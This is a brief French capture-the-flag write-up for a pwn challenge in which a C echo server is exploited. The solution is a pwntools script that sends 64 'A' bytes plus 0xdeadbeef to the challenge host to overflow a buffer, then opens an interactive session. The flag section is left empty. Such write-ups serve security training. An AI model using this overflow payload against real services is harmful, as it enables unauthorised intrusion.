# Description
Worty a décidé de s'entraîner à coder en C. Pour cela, il a créé un petit serveur qui répète ce qu'on lui dit.
Prouvez-lui qu'il devrait améliorer son code !
Accès au challenge: `nc ctf.midnightflag.fr 9020`
PS: Pour tous les challenges de pwn, les flags dans les binaires que vous téléchargez sont évidemment faux!

# Write UP
```python
#!/usr/bin/python

from pwn import *

r = remote('ctf.midnightflag.fr', 9020)

buf = "A"*0x40
buf += p32(0xdeadbeef)

r.sendline(buf)

r.interactive()
```

# Flag 
-
